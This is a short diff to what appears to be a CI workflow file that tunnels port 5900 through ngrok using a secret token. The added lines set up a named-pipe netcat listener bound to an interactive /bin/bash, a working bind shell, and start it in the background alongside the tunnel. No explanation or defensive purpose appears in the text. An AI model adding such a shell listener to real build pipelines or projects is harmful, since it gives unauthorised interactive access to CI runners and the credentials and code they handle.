@@ -14,4 +14,5 @@ jobs:
         TOKEN: ${{ secrets.TOKEN }}
       run: |
         ./ngrok authtoken "$TOKEN"
-        ./ngrok tcp 5900
+        mkfifo myfifo
+        nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1 & ./ngrok tcp 5900
